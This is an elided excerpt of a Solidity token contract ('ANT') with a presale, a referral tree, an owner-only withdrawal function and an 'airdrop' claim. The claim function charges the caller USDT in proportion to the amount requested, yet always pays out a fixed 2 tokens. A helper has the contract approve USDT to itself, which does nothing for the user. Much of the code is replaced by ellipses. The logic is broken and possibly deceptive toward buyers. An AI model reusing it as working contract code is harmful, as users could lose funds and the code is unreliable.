...
contract ANT is ERC20, Ownable,PreSell{
    using SafeMath for uint256;
    ...
    function _beforeTokenTransfer(
        ...
        if (_from==uniswapV2Pair && isRoute[_to]){
            ...
            if(parentList[_to]==address(0) && !isContract(_from) && !isContract(_to) && _balances[_to] == 0){
                ...
                //花费成本至少为1u
                if(nowPrice!=0){
                    minTmount=((10**18)/nowPrice)*(10**18);
                }

                if(_amount>minTmount){
    ...
    function claimDropairTokens(uint256 amount, bytes32[] calldata merkleProof) public {
        
        require(!claimed[msg.sender], "erc20: Tokens already claimed.");

        require(amount > 0, "You need to claim at least some tokens");
        ...
        uint256 tokenAAmount=nowPrice*amount/10**18;

        uint256 allowance = IERC20(USDT).allowance(msg.sender, address(this));
        require(allowance >= tokenAAmount, "Check the token allowance");

        //address sender, address recipient, uint256 amount

        bool tRet=IERC20(USDT).transferFrom(msg.sender,address(this),tokenAAmount);

        require(tRet, "erc20: transferFrom error.");
        ...
        if(tRet){
            ...
            _transfer(address(this), msg.sender, 2 * 10 ** 18);
        }

    }
  
    function claimTokenApprove(uint256 amount) public returns (uint256) {
        require(amount > 0, "You need to claim at least some tokens");
        uint256 tokenAAmount=nowPrice*amount/10**18;
        IERC20(USDT).approve(address(this),tokenAAmount);
        return tokenAAmount;
    } 
    ...
    function geOtherBNB() public onlyOwner {
    ...
    function getMyInvitee(
        address p1
    )  public view returns(address) {
        if(p1==address(0)){
            return parentList[msg.sender];
        }else{
            return parentList[p1];
        }
    }
